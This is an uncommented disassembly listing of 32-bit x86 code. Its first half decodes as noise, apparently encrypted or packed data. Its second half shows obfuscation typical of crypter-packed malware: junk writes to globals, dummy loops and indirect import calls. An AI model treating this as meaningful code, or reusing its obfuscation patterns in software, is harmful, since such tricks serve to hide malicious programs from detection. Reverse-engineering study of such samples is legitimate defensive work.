  408c64:	push   0xfffffff2
  408c66:	mov    dh,0x4b
  408c68:	inc    eax
  408c69:	rol    DWORD PTR [ecx],cl
  408c6b:	push   cs
  408c6c:	xor    DWORD PTR [esi],esi
  408c6e:	xchg   edi,eax
  408c6f:	mov    al,0x2a
  408c71:	cwde   
  408c72:	nop
  408c73:	sbb    dl,BYTE PTR [edx+ebx*1-0x44]
  408c77:	sub    BYTE PTR [ecx-0x3c],bh
  408c7a:	daa    
  408c7b:	mov    ebp,0xb92388f6
  408c80:	adc    dh,dh
  408c82:	fmul   DWORD PTR [eax-0x7a]
  408c85:	and    DWORD PTR [eax-0x1d],ebx
  408c88:	imul   esi,DWORD PTR [ebx-0x1b414c0d],0xffffffc9
  408c8f:	fdiv   DWORD PTR [ecx-0x10809008]
  408c95:	jo     0x408ccb
  408c97:	out    dx,al
  408c98:	mov    dh,0xc
  408c9a:	cwde   
  408c9b:	mov    bl,0xa
  408c9d:	(bad)  
  408c9e:	jmp    0x9604:0xb04339e2
  408ca5:	cmc    
  408ca6:	(bad)  
  408ca8:	jo     0x408d1a
  408caa:	data16 shl BYTE PTR [edx-0x3c],0x51
  408caf:	push   eax
  408cb0:	xor    eax,0xf4547b7d
  408cb5:	into   
  408cb6:	inc    ecx
  408cb7:	dec    ebx
  408cb8:	pop    edx
  408cb9:	(bad)  
  408cba:	pop    edi
  408cbb:	test   eax,0xe043e816
  408cc0:	mov    ch,0xba
  408cc2:	fs test ah,0x32
  408cc6:	add    al,BYTE PTR [eax-0xc84d830]
  408ccc:	mov    ebp,0x2a63fbc6
  408cd1:	aad    0x33
  408cd3:	push   eax
  408cd4:	fs hlt 
  408cd6:	jp     0x408d0c
  408cd8:	cdq    
  408cd9:	xlat   BYTE PTR ds:[ebx]
  408cda:	adc    dl,dh
  408cdc:	inc    DWORD PTR [esi+edi*1]
  408cdf:	in     al,0x1f
  408ce1:	fcom   st(3)
  408ce3:	mov    ch,0x21
  408ce5:	jae    0x408cf1
  408ce7:	add    DWORD PTR [edi+ecx*1-0x76],esi
  408ceb:	mov    cl,0x92
  408ced:	fwait
  408cee:	js     0x408d2a
  408cf0:	jmp    0xa3d6b414
  408cf5:	push   ds
  408cf6:	enter  0xcf14,0x37
  408cfa:	out    dx,eax
  408cfb:	std    
  408cfc:	mov    dh,BYTE PTR [edx-0x31a2da2]
  408d02:	cld    
  408d03:	add    al,BYTE PTR es:[eax+0x16]
  408d07:	aas    
  408d08:	lods   eax,DWORD PTR ds:[esi]
  408d09:	scas   eax,DWORD PTR es:[edi]
  408d0a:	xchg   esp,eax
  408d0b:	adc    dl,BYTE PTR [edi+0x58f7bf96]
  408d11:	cmp    eax,0x73342415
  408d16:	and    esp,edx
  408d18:	pop    ebx
  408d19:	cmp    cl,BYTE PTR [edi+ebp*4-0x29b82f2a]
  408d20:	repz into 
  408d22:	jge    0x408cd0
  408d24:	int    0xf7
  408d26:	mov    eax,ds:0xdb3d6933
  408d2b:	sub    DWORD PTR [edi-0x6edbbf7f],0x9dedfd29
  408d35:	idiv   DWORD PTR [eax+0x18efeb57]
  408d3b:	dec    ecx
  408d3c:	xchg   edx,eax
  408d3d:	xchg   ecx,eax
  408d3e:	das    
  408d3f:	std    
  408d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d41:	out    dx,al
  408d42:	popf   
  408d43:	add    al,0xe7
  408d45:	mov    DWORD PTR [ecx+0x38],ebx
  408d48:	mov    ecx,0x50441b21
  408d4d:	lods   eax,DWORD PTR ds:[esi]
  408d4e:	jbe    0x408d3f
  408d50:	and    ecx,DWORD PTR [ebx-0xda4f07e]
  408d56:	mov    ebx,0xac439cd8
  408d5b:	mov    al,ds:0xa91650cf
  408d60:	and    eax,0xdb659f5a
  408d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d66:	pop    edi
  408d67:	loop   0x408dd5
  408d69:	test   DWORD PTR [ebx+0x1f7b99f9],edi
  408d6f:	and    eax,0xf44f6ad9
  408d74:	imul   eax,DWORD PTR [eax],0xd703c057
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	jge    0x408d39
  408dac:	hlt    
  408dad:	push   esi
  408dae:	mov    cl,0xd1
  408db0:	jle    0x408e30
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408dd2
  408db7:	xchg   ecx,eax
  408db8:	pop    edx
  408db9:	sub    edi,edx
  408dbb:	(bad)  
  408dbc:	out    dx,eax
  408dbd:	push   eax
  408dbe:	fdiv   DWORD PTR [eax+0x4a326f09]
  408dc4:	out    dx,eax
  408dc5:	ja     0x408d7d
  408dc7:	or     al,0x6b
  408dc9:	loope  0x408e2c
  408dcb:	sbb    DWORD PTR [eax+0x51],0x158d0b1
  408dd2:	jnp    0x408da7
  408dd4:	sub    ebp,DWORD PTR [edi]
  408dd6:	xchg   esi,eax
  408dd7:	cmp    dl,BYTE PTR [ebx+0x40]
  408dda:	dec    esp
  408ddb:	jp     0x408e3d
  408ddd:	outs   dx,DWORD PTR ds:[esi]
  408dde:	ret    0xa1cc
  408de1:	in     al,0x1
  408de3:	fild   QWORD PTR [ecx]
  408de5:	std    
  408de6:	jbe    0x408d6d
  408de8:	push   ss
  408de9:	mov    ebx,0x2d95049f
  408dee:	repz jno 0x408d86
  408df1:	pop    es
  408df2:	sub    DWORD PTR [ebx+0x505389b9],edi
  408df8:	xor    esi,DWORD PTR [ebx+eiz*1+0x73]
  408dfc:	add    DWORD PTR [ecx+ebp*4-0x15a077f0],ecx
  408e03:	adc    esp,DWORD PTR [edi+eax*4-0x16]
  408e07:	sbb    BYTE PTR [edx+0x13bfcf2],cl
  408e0d:	sbb    DWORD PTR [edi+0x58],edx
  408e10:	mov    esp,0x8be0f062
  408e15:	sub    BYTE PTR [ecx],ah
  408e17:	cs pop ds
  408e19:	mov    al,ds:0x624837b2
  408e1e:	dec    ebx
  408e1f:	mov    dh,0x66
  408e21:	add    DWORD PTR [eax+eiz*8],ebx
  408e24:	imul   DWORD PTR [ebx]
  408e26:	sbb    BYTE PTR [esi-0x5b69e2fe],dl
  408e2c:	sub    ebp,DWORD PTR [edi+0x4a]
  408e2f:	or     eax,0xc88275ec
  408e34:	cs data16 mov ah,0xd5
  408e38:	dec    eax
  408e39:	pusha  
  408e3a:	pop    esp
  408e3b:	dec    ecx
  408e3c:	ret    0x19a7
  408e3f:	das    
  408e40:	adc    al,0x18
  408e42:	push   0x38
  408e44:	dec    dx
  408e46:	sti    
  408e47:	or     BYTE PTR [ebp+0x2a],ah
  408e4a:	std    
  408e4b:	or     eax,0x7fd2ff13
  408e50:	mov    dl,0xc1
  408e52:	fsub   QWORD PTR [esi+eiz*4]
  408e55:	retf   0xa312
  408e58:	ret    
  408e59:	repnz push eax
  408e5b:	xchg   ebp,eax
  408e5c:	jmp    0x408edd
  408e5e:	mov    bh,BYTE PTR [esi+0x14]
  408e61:	stos   BYTE PTR es:[edi],al
  408e62:	sti    
  408e63:	outs   dx,BYTE PTR ds:[esi]
  408e64:	pop    esp
  408e65:	or     bh,dl
  408e67:	adc    al,0xe3
  408e69:	test   BYTE PTR [esi-0x4d],bh
  408e6c:	ins    BYTE PTR es:[edi],dx
  408e6d:	cmp    DWORD PTR [edx],esp
  408e6f:	clc    
  408e70:	sbb    BYTE PTR [esi+0x58514233],0xa1
  408e77:	fs popf 
  408e79:	je     0x408ecc
  408e7b:	mov    ah,0x7e
  408e7d:	lods   eax,DWORD PTR ds:[esi]
  408e7e:	inc    edx
  408e7f:	popa   
  408e80:	std    
  408e81:	out    dx,eax
  408e82:	inc    ebx
  408e83:	cmc    
  408e84:	and    DWORD PTR [edx-0x6],eax
  408e87:	mov    dl,0x13
  408e89:	repz loop 0x408e4b
  408e8c:	push   ebx
  408e8d:	arpl   WORD PTR [ebx+0x18279d38],di
  408e93:	mov    eax,0x8e2e20bc
  408e98:	ja     0x408e77
  408e9a:	out    0x0,al
  408e9c:	xchg   ch,ah
  408e9e:	jns    0x408eee
  408ea0:	push   esi
  408ea1:	sbb    DWORD PTR [eax],ebp
  408ea3:	nop
  408ea4:	enter  0x93e1,0x36
  408ea8:	(bad)  
  408eab:	in     al,dx
  408eac:	es scas eax,DWORD PTR es:[edi]
  408eae:	push   ecx
  408eaf:	mov    eax,0xa6d6e4d9
  408eb4:	xchg   esi,eax
  408eb5:	cld    
  408eb6:	outs   dx,DWORD PTR ds:[esi]
  408eb7:	sbb    eax,0x3e89f9d3
  408ebc:	pop    ss
  408ebd:	clc    
  408ebe:	sbb    DWORD PTR [esi-0x79],ebp
  408ec1:	mov    dl,0xe7
  408ec3:	mov    ebx,0xc1e66e38
  408ec8:	xor    BYTE PTR [ecx+edi*8+0x6e647b4f],bl
  408ecf:	scas   eax,DWORD PTR es:[edi]
  408ed0:	sbb    eax,0x5b8404f6
  408ed5:	test   BYTE PTR [ecx+0x1959d487],bl
  408edb:	xor    dh,BYTE PTR [esi+0x12]
  408ede:	ror    BYTE PTR [esi+edi*1+0x438554e5],0x40
  408ee6:	add    BYTE PTR [edx+ebp*8+0x5b5b0e25],bh
  408eed:	cmc    
  408eee:	shl    edx,0xa1
  408ef1:	addr16 (bad) 
  408ef3:	fld    QWORD PTR [edi]
  408ef5:	push   0xb989ce06
  408efa:	mov    BYTE PTR [esi],ch
  408efc:	or     ch,bl
  408efe:	sti    
  408eff:	push   ss
  408f00:	lahf   
  408f01:	push   ds
  408f02:	aam    0xc8
  408f04:	mov    ah,0x6
  408f06:	mov    ch,0x89
  408f08:	sub    dh,dl
  408f0a:	xor    BYTE PTR [ebp+edx*4-0x35bd3350],bl
  408f11:	push   ebp
  408f12:	mov    WORD PTR [edx-0x160c64d],?
  408f18:	scas   al,BYTE PTR es:[edi]
  408f19:	fisttp WORD PTR [ebp+ecx*8-0x54fbf0ce]
  408f20:	and    al,0x9a
  408f22:	aam    0x9c
  408f24:	ja     0x408f50
  408f26:	jl     0x408ee3
  408f28:	inc    ebx
  408f29:	scas   al,BYTE PTR es:[edi]
  408f2a:	scas   eax,DWORD PTR es:[edi]
  408f2b:	out    dx,eax
  408f2c:	hlt    
  408f2d:	mov    cl,ch
  408f2f:	or     al,0xc6
  408f31:	xor    esp,eax
  408f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f34:	and    ebp,DWORD PTR [ecx+0x4271ffc0]
  408f3a:	fucom  st(0)
  408f3c:	xchg   esi,eax
  408f3d:	pop    es
  408f3e:	ficom  WORD PTR [eax+ecx*8-0x3186bb11]
  408f45:	cmp    dh,BYTE PTR [ebx-0x74e851d6]
  408f4b:	pop    ebp
  408f4c:	clc    
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	fs xchg ebx,eax
  408f62:	ret    0xcdda
  408f65:	fistp  QWORD PTR [esi+0x7e]
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408f18
  408f6d:	xor    DWORD PTR [esi+esi*8+0x67],esi
  408f71:	stc    
  408f72:	ins    BYTE PTR es:[edi],dx
  408f73:	jae    0x408fef
  408f75:	inc    eax
  408f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f77:	daa    
  408f78:	jnp    0x408f6a
  408f7a:	sbb    dh,BYTE PTR ds:0xa897ac4e
  408f80:	mov    al,ds:0xe592c2e9
  408f85:	out    0x3d,al
  408f87:	sub    eax,0x373ec51c
  408f8c:	(bad)  
  408f8d:	or     al,0xbb
  408f8f:	or     al,0x16
  408f91:	scas   eax,DWORD PTR es:[edi]
  408f92:	jecxz  0x408f45
  408f94:	call   0x432b3158
  408f99:	enter  0x9a1e,0x28
  408f9d:	or     al,0xaf
  408f9f:	xchg   edx,eax
  408fa0:	mov    ebp,0xb3593f
  408fa5:	and    DWORD PTR [esi+0xa],edx
  408fa8:	add    al,0xdd
  408faa:	aas    
  408fab:	add    eax,0x60567516
  408fb0:	pop    edi
  408fb1:	and    eax,0x904bf860
  408fb6:	sub    DWORD PTR [esi-0x2e2b9a42],ecx
  408fbc:	cmp    al,ch
  408fbe:	mul    cl
  408fc0:	jle    0x409013
  408fc2:	les    eax,FWORD PTR [ecx+0x5f]
  408fc5:	aam    0xbe
  408fc7:	loop   0x408f84
  408fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fca:	inc    edi
  408fcb:	cld    
  408fcc:	loopne 0x408f69
  408fce:	(bad)  
  408fd0:	cmc    
  408fd1:	sbb    BYTE PTR [ebp+0x63],dh
  408fd4:	dec    esp
  408fd5:	mov    ah,0xa
  408fd7:	cld    
  408fd8:	inc    ecx
  408fd9:	fimul  WORD PTR ds:0x275e47d3
  408fdf:	int    0xb6
  408fe1:	(bad)  
  408fe2:	loopne 0x408f99
  408fe4:	inc    esp
  408fe5:	scas   al,BYTE PTR es:[edi]
  408fe6:	xchg   cl,dh
  408fe8:	adc    DWORD PTR [ebp-0x25],esi
  408feb:	mov    ds:0x60c7f5ba,al
  408ff0:	in     eax,0xda
  408ff2:	hlt    
  408ff3:	dec    ebp
  408ff4:	adc    DWORD PTR [esi],esi
  408ff6:	sub    DWORD PTR [edi],edi
  408ff8:	int    0x90
  408ffa:	adc    eax,0x21b9ba17
  408fff:	pop    eax
  409000:	aad    0x8e
  409002:	retf   0xf61d
  409005:	xchg   esi,eax
  409006:	out    dx,al
  409007:	dec    edi
  409008:	and    DWORD PTR [ebx],edi
  40900a:	and    DWORD PTR [esi],edx
  40900c:	and    edi,DWORD PTR [si]
  40900f:	xor    eax,0x3a81c7c0
  409014:	jg     0x408fae
  409016:	dec    ecx
  409017:	outs   dx,DWORD PTR ds:[esi]
  409018:	les    esi,FWORD PTR [edx-0x7acf2eb0]
  40901e:	xor    al,0xda
  409020:	fwait
  409021:	or     DWORD PTR [esi-0x2ab79545],esi
  409027:	ret    0x9129
  40902a:	mov    BYTE PTR [ecx],bl
  40902c:	test   DWORD PTR [ebx+0x48],edi
  40902f:	pop    esi
  409030:	sahf   
  409031:	jecxz  0x409037
  409033:	fldcw  WORD PTR [esp+eiz*8]
  409036:	repz jb 0x40900f
  409039:	add    ecx,DWORD PTR [ebx+ebx*8+0x2150373b]
  409040:	sahf   
  409041:	pop    esp
  409042:	adc    ecx,DWORD PTR [edi-0x161920c4]
  409048:	fld    QWORD PTR [edx+0x58]
  40904b:	mov    ah,0x3b
  40904d:	pop    ecx
  40904e:	jne    0x4090af
  409050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409051:	push   DWORD PTR [edi+eiz*1+0x4404b648]
  409058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409059:	jno    0x408fe0
  40905b:	or     cl,dl
  40905d:	out    dx,al
  40905e:	ret    
  40905f:	fwait
  409060:	leave  
  409061:	xor    BYTE PTR [ecx-0x10063078],ch
  409067:	xchg   ebp,eax
  409068:	out    0x20,eax
  40906a:	or     al,0x22
  40906c:	ret    0x7ff6
  40906f:	add    eax,0x9da8f66e
  409074:	jmp    0x266e733f
  409079:	rol    BYTE PTR [ebp-0x5296dff8],cl
  40907f:	push   0x77
  409081:	push   0x42
  409083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409084:	jge    0x409097
  409086:	or     DWORD PTR [ecx-0x53],ebx
  409089:	data16 mov dh,0x2d
  40908c:	pop    ds
  40908d:	lods   eax,DWORD PTR ds:[esi]
  40908e:	mov    al,0x4a
  409090:	xor    eax,0x265711b3
  409095:	jge    0x4090dd
  409097:	mov    ecx,0xe47d8a52
  40909c:	dec    ebp
  40909d:	addr16 dec edi
  40909f:	ds pop ebp
  4090a1:	dec    edi
  4090a2:	dec    esp
  4090a3:	push   ds
  4090a4:	xchg   esp,eax
  4090a5:	mov    eax,ds:0xb4c16380
  4090aa:	icebp  
  4090ab:	shr    BYTE PTR [ecx-0x56f1aa15],1
  4090b1:	sub    al,0xc4
  4090b3:	outs   dx,DWORD PTR ds:[esi]
  4090b4:	sbb    eax,0x328732fc
  4090b9:	push   esp
  4090ba:	ror    BYTE PTR [eax],1
  4090bc:	mov    ecx,0x289610eb
  4090c1:	adc    eax,0x73f59552
  4090c6:	cmp    edi,ebp
  4090c8:	(bad)  
  4090ca:	sub    BYTE PTR [edx+eiz*2-0x75],al
  4090ce:	ret    
  4090cf:	ja     0x409125
  4090d1:	lahf   
  4090d2:	sub    BYTE PTR [eax-0x5c],al
  4090d5:	pusha  
  4090d6:	pop    ebx
  4090d7:	jo     0x40910f
  4090d9:	fistp  WORD PTR [bx+si]
  4090dc:	mov    esp,0x782d25b5
  4090e1:	sub    eax,0xd819fb7
  4090e6:	and    DWORD PTR [ebx+0xc],ebp
  4090e9:	imul   ebp,DWORD PTR [edx],0x66d710a1
  4090ef:	jl     0x40909f
  4090f1:	call   0xf104:0x7e45a8f2
  4090f8:	sbb    eax,0x591cf9a5
  4090fd:	sbb    ch,BYTE PTR [edi-0x2f]
  409100:	add    edx,ecx
  409102:	imul   edx,ebx
  409105:	cmp    edx,edi
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42e8b7
  40911f:	and    DWORD PTR ds:0x43035b,0x4302bd
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42ec5b,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x430363,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e658,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42e8f7
  40916b:	sbb    DWORD PTR ds:0x4302c1,0x4302f1
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42ec4b,0x624a
  409184:	call   DWORD PTR ds:0x42e8bf
  40918a:	adc    DWORD PTR ds:0x42e640,0x4302dd
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x4302d1,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x4302b5,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x4302ed,0x42e654
  4091c4:	call   DWORD PTR ds:0x42e963
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e648
  4091d6:	and    DWORD PTR ds:0x4302d9,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x4302b9,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42ec5b,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42ec5b,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e863
  409219:	mov    ecx,DWORD PTR ds:0x42ec5b
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42ec5b,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ec63,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42ec5f
  409243:	sbb    eax,DWORD PTR ds:0x42ec5b
  409249:	mov    ds:0x42ec5f,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42ec5b
  409261:	and    DWORD PTR ds:0x42e63c,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x4302d5,0x430357
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e64c,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x4302d5,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42ec4b,0x430367
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42ec4b,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x4302c9,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x4302d9,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ec63,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e648,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x4302b5,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e87f
  40930f:	adc    DWORD PTR ds:0x42ec5f,0x42e64c
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x4302d5,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x4302d1,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x4302d1
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x4302d1,ecx
  409352:	cmp    DWORD PTR ds:0x4302d1,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x4302d1,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e867
  409375:	cmp    DWORD PTR ds:0x4302d1,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x4302d1
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x4302d1,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42ec4b
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e7e7
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x430353,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x43036b,0x17
  4093b9:	cmp    DWORD PTR ds:0x43036b,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x43036b,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e86b
  4093df:	cmp    DWORD PTR ds:0x43036b,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x43036b
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x43036b,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x43036b
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x43036b,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x43035f,0x10
  409415:	cmp    DWORD PTR ds:0x43035f,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x43035f,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e86f
  409438:	mov    ecx,DWORD PTR ds:0x43035f
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x43035f,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x4302e1
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x4302e9,0x16
  409461:	cmp    DWORD PTR ds:0x4302e9,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x4302e9,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e873
  409481:	mov    ecx,DWORD PTR ds:0x4302e9
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x4302e9,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42ec4f,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42ec4f
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42ec4f,ecx
  4094b7:	cmp    DWORD PTR ds:0x42ec4f,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42ec4f,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e77b
  4094d6:	push   0x42e725
  4094db:	call   DWORD PTR ds:0x42eaab
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x4302d1,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x43036b,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ec63,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x4302e9,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x430363,0x4302f1
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x4302b9,0x1e
  40953f:	cmp    DWORD PTR ds:0x4302b9,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x4302b9,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e65c
  409566:	call   DWORD PTR ds:0x42e877
  40956c:	mov    eax,ds:0x4302b9
  409571:	dec    eax
  409572:	mov    ds:0x4302b9,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430309
  409582:	mov    eax,ds:0x430393
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x43034f,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e658,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x4302c1,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x4302c1
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x4302c1,edx
  4095e8:	cmp    DWORD PTR ds:0x4302c1,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e74d
  409617:	call   DWORD PTR ds:0x42e87b
  40961d:	cmp    DWORD PTR ds:0x4302c1,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e648,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e648
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e648,ecx
  40964a:	cmp    DWORD PTR ds:0x42e648,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42eaaf
  409672:	cmp    DWORD PTR ds:0x42e648,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
